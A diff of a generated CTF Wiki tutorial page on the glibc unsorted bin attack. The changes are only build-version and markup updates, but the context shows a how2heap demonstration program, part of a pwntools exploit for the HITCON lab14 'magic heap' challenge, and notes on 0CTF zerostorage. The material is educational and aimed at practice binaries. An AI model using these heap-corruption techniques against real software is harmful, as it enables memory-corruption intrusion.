@@ -38,7 +38,7 @@
         <meta name="lang:search.tokenizer" content="[\uff0c\u3002]+">
       
       <link rel="shortcut icon" href="../../../..">
-      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.6.0">
+      <meta name="generator" content="mkdocs-1.1, mkdocs-material-4.6.3">
     
     
       
@@ -46,9 +46,9 @@
       
     
     
-      <link rel="stylesheet" href="../../../../assets/stylesheets/application.e194128b.css">
+      <link rel="stylesheet" href="../../../../assets/stylesheets/application.adb8469c.css">
       
-        <link rel="stylesheet" href="../../../../assets/stylesheets/application-palette.3e3d1dff.css">
+        <link rel="stylesheet" href="../../../../assets/stylesheets/application-palette.a8b3c06d.css">
       
       
         
@@ -57,7 +57,7 @@
       
     
     
-      <script src="../../../../assets/javascripts/modernizr.74668098.js"></script>
+      <script src="../../../../assets/javascripts/modernizr.86422ebf.js"></script>
     
     
       
@@ -4647,7 +4647,7 @@
 </ol>
 <h2 id="principle">Principle<a class="headerlink" href="#principle" title="Permanent link">&para;</a></h2>
 <p>In <a href="https://code.woboq.org/userspace/glibc/">glibc</a>/<a href="https://code.woboq.org/userspace/glibc/malloc/">malloc</a>/<a href="https _int_malloc in ://code.woboq.org/userspace/glibc/malloc/malloc.c.html">malloc.c</a> has such a piece of code that will take the position of <code>bck-&amp;gt;fd</code> when an unsorted bin is taken out. Write to the location of this Unsorted Bin.</p>
-<div class="codehilite"><pre><span></span>          <span class="cm">/* remove from unsorted list */</span>
+<div class="codehilite"><pre><span></span><code>          <span class="cm">/* remove from unsorted list */</span>
 
           <span class="k">if</span> <span class="p">(</span><span class="n">__glibc_unlikely</span> <span class="p">(</span><span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">!=</span> <span class="n">victim</span><span class="p">))</span>
 
@@ -4655,11 +4655,11 @@
 
 <span class="n">unsorted_chunks</span> <span class="p">(</span><span class="n">off</span><span class="p">)</span> <span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span> <span class="n">bk</span> <span class="o">=</span> <span class="n">bck</span><span class="p">;</span>
 <span class="n">bck</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">unsorted_chunks</span> <span class="p">(</span><span class="n">off</span><span class="p">);</span>
-</pre></div>
+</code></pre></div>
 
 <p>In other words, if we control the value of bk, we can write <code>unsorted_chunks (av)</code> to any address.</p>
 <p>Here I will take [unsorted_bin_attack.c] (<a href="https://github.com/shellphish/how2heap/blob/master/unsorted_bin_attack.c">https://github.com/shellphish/how2heap/blob/master/unsorted_bin_attack.c</a>) in shellphish&#39;s how2heap repository as an example. Here I make some simple modifications, as follows</p>
-<div class="codehilite"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<div class="codehilite"><pre><span></span><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
 
 <span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
 
@@ -4754,10 +4754,10 @@
   <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;%p: %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">target_var</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">target_var</span><span class="p">);</span>
 
 <span class="p">}</span>
-</pre></div>
+</code></pre></div>
 
 <p>The effect after the program is executed is</p>
-<div class="codehilite"><pre><span></span>➜  unsorted_bin_attack git:<span class="o">(</span>master<span class="o">)</span> ✗ gcc unsorted_bin_attack.c -o unsorted_bin_attack
+<div class="codehilite"><pre><span></span><code>➜  unsorted_bin_attack git:<span class="o">(</span>master<span class="o">)</span> ✗ gcc unsorted_bin_attack.c -o unsorted_bin_attack
 
 ➜  unsorted_bin_attack git:<span class="o">(</span>master<span class="o">)</span> ✗ ./unsorted_bin_attack
 
@@ -4790,7 +4790,7 @@ Let<span class="s1">&#39;s first look at the target we want to rewrite on stack:
 <span class="s1">Let&#39;</span>s malloc again to get the chunk we just free. During this time, target should has already been rewrite:
 
 0x7ffe0d232518: 0x7f1c705ffb78
-</pre></div>
+</code></pre></div>
 
 <p>Here we can use a diagram to describe the specific process and the principles behind it.</p>
 <p><img alt="" src="../figure/unsorted_bin_attack_order.png" /></p>
@@ -4802,7 +4802,7 @@ Let<span class="s1">&#39;s first look at the target we want to rewrite on stack:
 <p>After modification, the bk pointer of p in the unsorted bin will point to the fake chunk at target addr-16, that is, the Target Value is at the fd of the fake chunk.</p>
 <p><strong>Request a 400-size chunk</strong></p>
 <p>At this point, the requested chunk is in the range of the small bin, and there is no chunk in the corresponding bin, so it will go to the unsorted bin and find that the unsorted bin is not empty, so the last chunk in the unsorted bin is taken out.</p>
-<div class="codehilite"><pre><span></span><span class="k">while</span> <span class="p">((</span><span class="n">victim</span> <span class="o">=</span> <span class="n">unsorted_chunks</span> <span class="p">(</span><span class="n">off</span><span class="p">)</span> <span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span> <span class="n">bk</span><span class="p">)</span><span class="o">!</span> <span class="o">=</span> <span class="n">unsorted_chunks</span> <span class="p">(</span><span class="n">off</span><span class="p">))</span> <span class="p">{</span>
+<div class="codehilite"><pre><span></span><code><span class="k">while</span> <span class="p">((</span><span class="n">victim</span> <span class="o">=</span> <span class="n">unsorted_chunks</span> <span class="p">(</span><span class="n">off</span><span class="p">)</span> <span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span> <span class="n">bk</span><span class="p">)</span><span class="o">!</span> <span class="o">=</span> <span class="n">unsorted_chunks</span> <span class="p">(</span><span class="n">off</span><span class="p">))</span> <span class="p">{</span>
             <span class="n">bck</span> <span class="o">=</span> <span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span>
 
             <span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span><span class="p">(</span><span class="n">chunksize_nomask</span><span class="p">(</span><span class="n">victim</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">SIZE_SZ</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">||</span>
@@ -4846,7 +4846,7 @@ Let<span class="s1">&#39;s first look at the target we want to rewrite on stack:
 
 <span class="n">unsorted_chunks</span> <span class="p">(</span><span class="n">off</span><span class="p">)</span> <span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span> <span class="n">bk</span> <span class="o">=</span> <span class="n">bck</span><span class="p">;</span>
 <span class="n">bck</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">unsorted_chunks</span> <span class="p">(</span><span class="n">off</span><span class="p">);</span>
-</pre></div>
+</code></pre></div>
 
 <ul>
 <li>victim = unsorted_chunks (off) -&gt; bk = p</li>
@@ -4862,7 +4862,7 @@ Let<span class="s1">&#39;s first look at the target we want to rewrite on stack:
 </ul>
 <p><strong> It can be seen that in the process of taking the last chunk of the unsorted bin, the victim&#39;s fd does not work, so even if we modify it to an illegal value, it does not matter. </strong> However, it should be noted that the unsorted bin list may be destroyed, and problems may occur when inserting chunks.</p>
 <p>That is, the value of the target is changed to the linked table header 0x7f1c705ffb78 of the unsorted bin, which is the previously output information.</p>
-<div class="codehilite"><pre><span></span>We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7f1c705ffb78
+<div class="codehilite"><pre><span></span><code>We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7f1c705ffb78
 
 Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer
 
@@ -4873,7 +4873,7 @@ And we write it with the target address-16 <span class="o">(</span>in <span clas
 Let<span class="err">&#39;</span>s malloc again to get the chunk we just free. During this time, target should has already been rewrite:
 
 0x7ffe0d232518: 0x7f1c705ffb78
-</pre></div>
+</code></pre></div>
 
 <p>Here we can see that the unsorted bin attack can indeed modify the value of any address, but the value modified is not controlled by us. The only thing we can know is that this value is relatively large. <strong>And, it’s important to note that </strong></p>
 <p>This doesn&#39;t seem to be useful, but it&#39;s still a bit of an egg, for example</p>
@@ -4884,11 +4884,11 @@ Let<span class="err">&#39;</span>s malloc again to get the chunk we just free. D
 <h2 id="hitcon-training-lab14-magic-heap">HITCON Training lab14 magic heap<a class="headerlink" href="#hitcon-training-lab14-magic-heap" title="Permanent link">&para;</a></h2>
 <p>[Topic link] (<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unsorted_bin_attack/hitcontraining_lab14">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unsorted_bin_attack/hitcontraining_lab14</a>)</p>
 <p>Here we modify the l33t function in the source program so that it can run normally.</p>
-<div class="codehilite"><pre><span></span><span class="kt">void</span> <span class="nf">l33t</span><span class="p">()</span> <span class="p">{</span> <span class="n">system</span><span class="p">(</span><span class="s">&quot;cat ./flag&quot;</span><span class="p">);</span> <span class="p">}</span>
-</pre></div>
+<div class="codehilite"><pre><span></span><code><span class="kt">void</span> <span class="nf">l33t</span><span class="p">()</span> <span class="p">{</span> <span class="n">system</span><span class="p">(</span><span class="s">&quot;cat ./flag&quot;</span><span class="p">);</span> <span class="p">}</span>
+</code></pre></div>
 
 <h3 id="basic-information">Basic Information<a class="headerlink" href="#basic-information" title="Permanent link">&para;</a></h3>
-<div class="codehilite"><pre><span></span>➜  hitcontraining_lab14 git:<span class="o">(</span>master<span class="o">)</span> file magicheap
+<div class="codehilite"><pre><span></span><code>➜  hitcontraining_lab14 git:<span class="o">(</span>master<span class="o">)</span> file magicheap
 
 magicheap: ELF <span class="m">64</span>-bit LSB executable, x86-64, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="k">for</span> GNU/Linux <span class="m">2</span>.6.32, BuildID<span class="o">[</span>sha1<span class="o">]=</span>9f84548d48f7baa37b9217796c2ced6e6281bb6f, not stripped
 
@@ -4905,7 +4905,7 @@ magicheap: ELF <span class="m">64</span>-bit LSB executable, x86-64, version <sp
     NX:       NX enabled
 
     PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
-</pre></div>
+</code></pre></div>
 
 <p>It can be seen that the program is a dynamically linked 64 program, which mainly opens NX protection and Canary protection.</p>
 <h3 id="basic-skills">basic skills<a class="headerlink" href="#basic-skills" title="Permanent link">&para;</a></h3>
@@ -4924,7 +4924,7 @@ magicheap: ELF <span class="m">64</span>-bit LSB executable, x86-64, version <sp
 <li>Trigger the vulnerability.</li>
 </ol>
 <p>code show as below</p>
-<div class="codehilite"><pre><span></span><span class="ch">#!/usr/bin/env python</span>
+<div class="codehilite"><pre><span></span><code><span class="ch">#!/usr/bin/env python</span>
 
 <span class="c1"># -*- coding: utf-8 -*-</span>
 
@@ -5020,7 +5020,7 @@ magicheap: ELF <span class="m">64</span>-bit LSB executable, x86-64, version <sp
 <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;4869&quot;</span><span class="p">)</span>
 
 <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</pre></div>
+</code></pre></div>
 
 <h2 id="2016-0ctf-zerostorage-to-be-completed">2016 0CTF zerostorage-To be completed<a class="headerlink" href="#2016-0ctf-zerostorage-to-be-completed" title="Permanent link">&para;</a></h2>
 <p><strong>Note: To be completed further. </strong></p>
@@ -5028,7 +5028,7 @@ magicheap: ELF <span class="m">64</span>-bit LSB executable, x86-64, version <sp
 <p><strong> This question was given to the server version and kernel version of the server, so I can debug it exactly the next time. Here we will debug directly with our local machine. However, in the current Ubuntu 16.04, due to further randomization, the relative offset between the location where libc is loaded and the location where the program module is loaded is no longer fixed, so the strategy of BriefX cannot be used again. It seems that only angelboy can be used. Strategy. </strong></p>
 <h3 id="security-check">Security check<a class="headerlink" href="#security-check" title="Permanent link">&para;</a></h3>
 <p>It can be seen that the program has opened all protections.</p>
-<div class="codehilite"><pre><span></span>pwndbg&gt; checksec
+<div class="codehilite"><pre><span></span><code>pwndbg&gt; checksec
 
 <span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/unsorted_bin_attack/zerostorage/zerostorage&#39;</span>
 
@@ -5043,11 +5043,11 @@ magicheap: ELF <span class="m">64</span>-bit LSB executable, x86-64, version <sp
     PIE:      PIE enabled
 
     FORTIFY:  Enabled
-</pre></div>
+</code></pre></div>
 
 <h3 id="basic-function-analysis">Basic function analysis<a class="headerlink" href="#basic-function-analysis" title="Permanent link">&para;</a></h3>
 <p>The program manages the storage space in the bss segment, with the functions of insert, delete, merge, delete, view, enumerate, and exit. The structure of this storage is as follows</p>
-<div class="codehilite"><pre><span></span>00000000 Storage         struc ; (sizeof=0x18, mappedto_7)
+<div class="codehilite"><pre><span></span><code>00000000 Storage         struc ; (sizeof=0x18, mappedto_7)
 
 00000000                                         ; XREF: .bss:storage_list/r
 
@@ -5058,7 +5058,7 @@ magicheap: ELF <span class="m">64</span>-bit LSB executable, x86-64, version <sp
 00000010 xor_addr        dq ?
 
 00000018 Storage         ends
-</pre></div>
+</code></pre></div>
 
 <h4 id="insert-1">insert-1<a class="headerlink" href="#insert-1" title="Permanent link">&para;</a></h4>
 <p>The basic functions are as follows</p>
@@ -5209,7 +5209,7 @@ magicheap: ELF <span class="m">64</span>-bit LSB executable, x86-64, version <sp
       
     </div>
     
-      <script src="../../../../assets/javascripts/application.970603a6.js"></script>
+      <script src="../../../../assets/javascripts/application.df00da5d.js"></script>
       
         
         
@@ -5224,7 +5224,7 @@ magicheap: ELF <span class="m">64</span>-bit LSB executable, x86-64, version <sp
           
         
       
-      <script>app.initialize({version:"1.0.4",url:{base:"../../../.."}})</script>
+      <script>app.initialize({version:"1.1",url:{base:"../../../.."}})</script>
       
         <script src="https://cdnjs.loli.net/ajax/libs/pangu/3.3.0/pangu.min.js"></script>
       
